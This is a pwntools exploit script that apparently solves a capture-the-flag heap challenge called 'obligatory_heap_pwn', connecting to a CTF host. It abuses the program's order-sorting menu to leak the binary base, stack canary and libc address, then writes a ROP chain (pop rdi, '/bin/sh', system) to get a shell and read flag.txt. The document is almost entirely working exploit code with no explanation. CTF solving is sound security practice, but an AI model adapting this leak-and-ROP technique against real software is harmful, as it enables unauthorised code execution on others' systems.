from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./obligatory_heap_pwn.patch"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote(
    "obligatory-heap-pwn-c685107298d7267a.challs.brunnerne.xyz", 443, ssl=True)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


def create_node(order_id, order_info):
    io.sendlineafter("> ", "1")
    io.sendlineafter("gib order id> ", str(order_id))
    io.sendafter("order> ", order_info)


def remove_node(order_id):
    io.sendlineafter("> ", "2")
    io.sendlineafter("gib order id> ", str(order_id))


def show_node(index):
    io.sendlineafter("> ", "3")
    io.sendlineafter("gib order id> ", str(index))
    io.recvuntil("order id --> ")
    order_id = int(io.recvline().strip())
    io.recvuntil("order info --> ")
    order_info = int(io.recvline().strip())
    return order_id, order_info


def sort_nodes():
    io.sendlineafter("> ", "4")


def quit():
    io.sendlineafter("> ", "5")


def deleteall():
    gibs = []
    for i in range(10):
        gib, _ = show_node(i)
        gibs.append(gib)

    for i in range(10):
        remove_node(gibs[i])


for i in range(2):
    create_node(0x800000000000 + i, b"t")


sort_nodes()

_, info = show_node(8)
elf.address = info - 0x1961
log.success("elf.address :-----> " + hex(elf.address))
rbp, canary = show_node(9)
log.success("canary :-----> " + hex(canary))
log.success("rbp :-----> " + hex(rbp))


deleteall()
create_node(rbp + 0x250+0x120, b"a")
create_node(rbp + 0x251+0x120, p64(canary))
create_node(rbp + 0x240+0x120, p64(elf.address+0x01832))
create_node(rbp + 0x23f, p64(canary))
sort_nodes()
_, leak = show_node(8)
libc.address = leak - 0x2a1ca
log.success("libc.address: -----> " + hex(libc.address))


quit()
deleteall()
pop_rdi = libc.address + 0x000000000010f75b
ret = libc.address + 0x000000000002882f
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
log.success("binsh :-----> " + hex(binsh_addr))
log.success("system :-----> " + hex(system_addr))

create_node(pop_rdi-0x10-0xf50000, p64(canary))
create_node(rbp+0x570+8, p64(elf.address+0x01832))
create_node(0x800000000000 + 1, b"t")
create_node(0x800000000000 + 2, b"t")
create_node(0x800000000000 + 3, b"t")
sort_nodes()
quit()

create_node(pop_rdi-1, p64(canary))
create_node(pop_rdi, p64(pop_rdi))
create_node(binsh_addr, p64(system_addr))

create_node(0x800000000000 + 1, b"t")
create_node(0x800000000000 + 2, b"t")
create_node(0x800000000000 + 3, b"t")
sort_nodes()
ddebug("breakrva 0x1872\n breakrva 0x01426\n breakrva 0x1936 \n continue")
quit()


io.sendline(b"cat flag.txt")

io.interactive()
